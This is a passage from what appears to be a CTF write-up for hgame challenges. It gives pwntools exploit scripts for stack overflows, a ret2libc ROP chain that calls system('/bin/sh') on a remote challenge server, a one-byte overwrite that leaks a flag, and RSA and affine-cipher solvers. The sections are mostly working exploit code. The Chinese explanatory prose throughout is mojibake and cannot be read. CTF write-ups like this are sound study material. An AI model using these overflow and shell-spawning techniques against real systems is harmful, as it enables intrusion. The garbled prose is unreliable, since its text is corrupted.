<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#io = process('./Hard_AAAAA')</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20000</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x7b</span> <span class="token operator">+</span> <span class="token string">'0O0o\x00O0'</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0!\n'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>getshellä¹‹åï¼Œè¯»å–flagæ–‡ä»¶</p>
<p><img src="/images/20ebc87d/pwn-1-4.png" alt="4"></p>
<hr>
<h3 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h3><p>çº¢æ¡†æ¡†èµ·çš„éƒ¨åˆ†ä¸ºå…³é”®éƒ¨åˆ†</p>
<p><img src="/images/20ebc87d/pwn-2-1.png" alt="1"></p>
<p><img src="/images/20ebc87d/pwn-2-2.png" alt="2">å…¶å®å°±æ˜¯æ ¹æ®è¯»å…¥çš„å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å¡«åˆ°æ•°ç»„é‡Œï¼Œä½†æ˜¯æ•°ç»„å¤§å°åªæœ‰11ï¼Œå¾ªç¯è¯»å…¥æ•°å­—çš„æ¬¡æ•°å´æ˜¯19ï¼Œæ¯æ¬¡å¯ä»¥å†™8ä¸ªå­—èŠ‚ï¼ˆ__int64æ˜¯8ä¸ªå­—èŠ‚ï¼‰ï¼Œè¶³å¤Ÿæº¢å‡ºä¿®æ”¹è¿”å›åœ°å€äº†ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æº¢å‡ºåˆ°å¾ªç¯å˜é‡içš„æ—¶å€™ï¼Œä¸è¦ä¿®æ”¹å˜é‡içš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬12æ¬¡è¯»å…¥æ•°å­—çš„æ—¶å€™ï¼Œè¦ä¿æŒå˜é‡içš„å€¼æ˜¯11ï¼Œè¿˜æœ‰å°±æ˜¯iæ˜¯4å­—èŠ‚æ•´æ•°ï¼Œå®ƒåˆšåˆšå¥½åœ¨æ•°ç»„v4ä¹‹åçš„8ä¸ªå­—èŠ‚çš„é«˜4ä¸ªå­—èŠ‚å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç¬¬12æ¬¡è¯»å…¥çš„æ•°å­—è½¬æˆ8å­—èŠ‚æ•´æ•°æ—¶ï¼Œå…¶é«˜4ä¸ªå­—èŠ‚çœ‹æˆä¸€ä¸ªintå‹æ•´æ•°ï¼Œå¿…é¡»æ˜¯11ï¼Œé‚£ä¹ˆæœ€ç®€å•å°±å†™<code>47244640256</code>è¿™ä¸ªæ•°å°±å¥½äº†ï¼ˆ47244640256 &gt;&gt; 32 == 11ï¼‰ï¼Œexpå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">packAddr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>


elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Number_Killer'</span><span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
pop_rdi_ret_addr <span class="token operator">=</span> <span class="token number">0x400803</span>
main_addr <span class="token operator">=</span> <span class="token number">0x4006f6</span>

<span class="token comment"># è¿™ä¸ªæ•°å†™æˆ8ä¸ªå­—èŠ‚ï¼Œé«˜å¤„4å­—èŠ‚å½“ä½œä¸€ä¸ªæ•´æ•°è§£æåˆšåˆšå¥½æ˜¯11ï¼Œå³47244640256>>32 == 11</span>
<span class="token comment"># æ•°ç»„å¤§å°ä¸º11ï¼Œå¾ªç¯å˜é‡å äº†8ä¸ªå­—èŠ‚æ•´æ•°ä¸­çš„é«˜4ä¸ªå­—èŠ‚ï¼Œå‹å…¥çš„rbpå äº†8ä¸ªå­—èŠ‚ï¼ˆä¸€ä¸ªæ•°è½¬æˆ8ä¸ªå­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œä¸º13</span>
payload <span class="token operator">=</span> <span class="token string">'47244640256\n'</span> <span class="token operator">*</span> <span class="token number">13</span>  

payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>pop_rdi_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'0\n'</span> <span class="token operator">*</span> <span class="token number">3</span>

<span class="token comment">#io = elf.process()</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.103.214.163"</span><span class="token punctuation">,</span> <span class="token number">20001</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

puts_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
puts_addr <span class="token operator">=</span> puts_addr <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">'47244640256\n'</span> <span class="token operator">*</span> <span class="token number">13</span> 
payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>pop_rdi_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> packAddr<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> packAddr<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'0\n'</span> <span class="token operator">*</span> <span class="token number">3</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flagï¼šç•¥ï¼ˆå“ˆå“ˆå“ˆï¼Œè‡ªå·±è¿è¡Œè„šæœ¬ï¼‰</p>
<hr>
<h3 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h3><p>å…³é”®ä½ç½®ï¼š</p>
<p><img src="/images/20ebc87d/pwn-3-1.png" alt="1"></p>
<p>è¯»å…¥ä¸€ä¸ªåœ°å€ï¼Œå°†è¿™ä¸ªåœ°å€æŒ‡å‘çš„é‚£ä¸ªå­—èŠ‚èµ‹å€¼ä¸º1ï¼ˆä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯æŠŠnameå˜é‡ä¿®æ”¹æˆflagï¼Œåæ¥å‘ç°ä¸å¯èƒ½ï¼‰</p>
<p>å…¶å®é—®é¢˜å¾ˆç®€å•ï¼Œå…ˆçœ‹ä¸‹å›¾ï¼š</p>
<p><img src="/images/20ebc87d/pwn-3-2.png" alt="2"></p>
<p>å¯ä»¥å‘ç°nameå’Œflagç›¸é‚»ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¯»å…¥çš„nameåˆšåˆšå¥½ç»“æŸç¬¦\0çš„ä¸‹ä¸€ä¸ªå­—èŠ‚å¼€å§‹å°±æ˜¯flagçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ä¸ª<code>*v4=1</code>æŠŠç»“æŸç¬¦\0ä¿®æ”¹æˆ1ï¼Œä¹Ÿå°±æ˜¯v4çš„è¾“å…¥ä¸º<code>0x6010E0</code>è¿™ä¸ªæ•°çš„å­—ç¬¦ä¸²ï¼ˆè¿™ä¸ªåœ°å€æ˜¯å›ºå®šçš„ï¼Œå¹¶æ²¡æœ‰éšæœºï¼‰ï¼Œé‚£ä¹ˆprintfçš„æ—¶å€™å°±ä¼šè¿ç€æŠŠflagç»™è¾“å‡ºäº†ï¼Œexpå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

name <span class="token operator">=</span> <span class="token string">'*'</span> <span class="token operator">*</span> <span class="token number">31</span>
addr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x6010DF</span><span class="token punctuation">)</span>

<span class="token comment">#io = process('./One_Shot')</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20002</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ï¼ˆæ€ªä¸å¾—é¢˜ç›®å«è¿™ä¸ªï¼‰</p>
<hr>
<h3 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h3><p><img src="/images/20ebc87d/pwn-4-1.png" alt="1"></p>
<p>å…¶å®å¾ˆæ˜äº†ï¼Œæ²¡æœ‰canaryä¿æŠ¤ï¼Œé¢˜ç›®æç¤ºå¯ä»¥é€šè¿‡æ–‡ä»¶è¯»å†™æ“ä½œæŠŠflagè¯»å‡ºæ¥ï¼Œè¯•äº†ä¸‹ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´é”™ï¼Œç„¶åå°±æ”¾å¼ƒäº†ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æ„é€ ROPï¼Œexpå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ROP_LEVEL0'</span><span class="token punctuation">)</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
start <span class="token operator">=</span> <span class="token number">0x40065b</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400753</span>


<span class="token comment">#io = elf.process()</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20003</span><span class="token punctuation">)</span>

<span class="token comment"># æ³„éœ²putsçš„åœ°å€ä»è€Œå¾—åˆ°libcåº“çš„ç‰ˆæœ¬ï¼Œstratä¸ºå‡½æ•°çš„å¼€å¤´ï¼Œè·³è½¬å›è¿™é‡Œç›¸å½“äºå†æ¥ä¸€æ¬¡æœºä¼šæº¢å‡º</span>
payload <span class="token operator">=</span>  <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span>  <span class="token comment"># 0x48ä¸ªç”¨äºå¡«å……ï¼Œ8ä¸ªå­—èŠ‚æ˜¯é‚£ä¸ªfdæ•°ç»„ï¼Œ8ä¸ªå­—èŠ‚æ˜¯rbp</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯\n</span>

puts_addr <span class="token operator">=</span> puts_addr <span class="token operator">+</span>  <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># è®¡ç®—å„ä¸ªé‡è¦çš„åœ°å€</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>


<span class="token comment"># å¾—åˆ°åœ°å€åï¼Œpwnï¼</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>æŸ¥ä¸€ä¸‹å¯†ç å­¦RSAçš„èµ„æ–™ï¼ŒçŸ¥é“p,q,eå¯ä»¥ç®—å‡ºç”¨æ¥è§£å¯†çš„dï¼ˆç›®å‰åªæ˜¯ç®€å•äº†è§£äº†ä¸‹ï¼‰ï¼Œé¢˜ç›®å·²ç»ç»™å‡ºæ¥äº†ï¼Œé‚£ä¹ˆexpå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">import</span> gmpy2

p <span class="token operator">=</span> <span class="token number">681782737450022065655472455411</span>
q <span class="token operator">=</span> <span class="token number">675274897132088253519831953441</span>
e <span class="token operator">=</span> <span class="token number">13</span>
c <span class="token operator">=</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span>

<span class="token comment"># ç®—å‡ºd</span>
phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># è§£å¯†c</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span>

<span class="token comment"># mæ˜¯ä¸€ä¸ªæ•°ï¼Œéœ€è¦è½¬æ¢æˆæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²</span>
flag <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span> <span class="token comment"># python2é•¿æ•´æ•°æœ€åé¢ä¼šæœ‰ä¸ªå­—ç¬¦L</span>
flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>æ ¹æ®é¢˜ç›®ï¼Œæœç´¢Affineï¼Œå¯ä»¥æŸ¥åˆ°ä»¿å°„åŠ å¯†ã€‚</p>
<p>ä»¿å°„åŠ å¯†è¦æ±‚è¿™ä¸ªAå¿…é¡»ä¸MODäº’ç´ ï¼Œå…¶å®Aæ˜¯MODå†…çš„ä¸€ä¸ªç´ æ•°ï¼ˆæˆ–è€…1ï¼‰ï¼Œç„¶åè¿™ä¸ªBå…¶å®å°±æ˜¯ä¸€ä¸ªåç§»ï¼ˆå½“A=1çš„æ—¶å€™ï¼Œè¿™ä¸ªåŠ å¯†å°±æ˜¯å‡¯æ’’åŠ å¯†äº†ï¼‰ï¼Œæˆ‘ä»¬åªéœ€è¦æšä¸¾Aå’ŒBï¼Œå¦‚æœAå’ŒBä»¿å°„åŠ å¯†<code>hgame</code>åæ˜¯<code>A8I5z</code>é‚£ä¹ˆè¿™å¯¹Aå’ŒBå°±æ˜¯æ­£ç¡®çš„ï¼Œexpå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>
<span class="token keyword">import</span> gmpy2

TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>
MOD <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">'hgame'</span>
encrypt_flag <span class="token operator">=</span> <span class="token string">'A8I5z'</span>
data <span class="token operator">=</span> <span class="token string">'A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;'</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""åŠ å¯†ç®—æ³•"""</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            cipher <span class="token operator">+=</span> b
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            ii <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD
            cipher <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span>
    <span class="token keyword">return</span> cipher

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""è§£å¯†æ•°æ®"""</span>
    <span class="token comment"># ç®—å‡ºaçš„ä¹˜æ³•é€†å…ƒç´ a_ï¼Œè§£å¯†éœ€è¦a_</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MOD<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i<span class="token operator">*</span>A <span class="token operator">%</span> MOD <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            a_ <span class="token operator">=</span> i
            <span class="token keyword">break</span>

    <span class="token comment"># æ ¹æ®a_è§£å¯†</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> ch
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            ii <span class="token operator">=</span> a_ <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD
            result <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span>
    <span class="token keyword">return</span> result


<span class="token keyword">def</span> <span class="token function">generate_prime</span><span class="token punctuation">(</span>max_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""ç”Ÿæˆmax_numä»¥å†…çš„ç´ æ•°"""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>max_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">yield</span> i

<span class="token comment"># æšä¸¾Aå’ŒB</span>
<span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MOD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> generate_prime<span class="token punctuation">(</span>MOD<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> encrypt_flag<span class="token punctuation">:</span>
            <span class="token comment">#print('A=%d, B=%d', a, b)</span>
            ret <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="not-One-time"><a href="#not-One-time" class="headerlink" title="not_One-time"></a>not_One-time</h3><p>ä¸€å¼€å§‹æŸ¥åˆ°many-time-padï¼Œä½†æ˜¯ä»¥ç°æœ‰çš„å·¥å…·éƒ½ä¸è¡Œï¼Œå­¦é•¿è¯´ä¸æ˜¯è¿™æ ·æçš„ã€‚ã€‚ã€‚</p>
<p>ç„¶åæˆ‘åœ¨ä¸€ä¸ªmany-time-padçš„æ”»å‡»è„šæœ¬ä¸­å¾—åˆ°çµæ„Ÿï¼Œå®ƒæ˜¯æ ¹æ®è¯­ä¹‰è‡ªå·±çŒœå‡ºæ˜æ–‡æˆ–è€…å¯†é’¥ã€‚</p>
<p>ç„¶åæˆ‘æƒ³äº†ä¸‹ï¼Œå“ªé‡Œç”¨è‡ªå·±çŒœï¼Œç›´æ¥çˆ†ç ´flagä¸å°±å¾—äº†ã€‚</p>
<p>å¼‚æˆ–è¿ç®—æœ‰ä¸ªç‰¹ç‚¹ï¼š<code>A xor B xor B == A</code>ï¼Œæ ·æœ¬æ•°æ®ï¼ˆå°±æ˜¯åŠ å¯†åçš„æ•°æ®ï¼‰æ˜¯è¿™ä¹ˆæ¥çš„ï¼š<code>æ˜æ–‡ xor flag == sample</code></p>
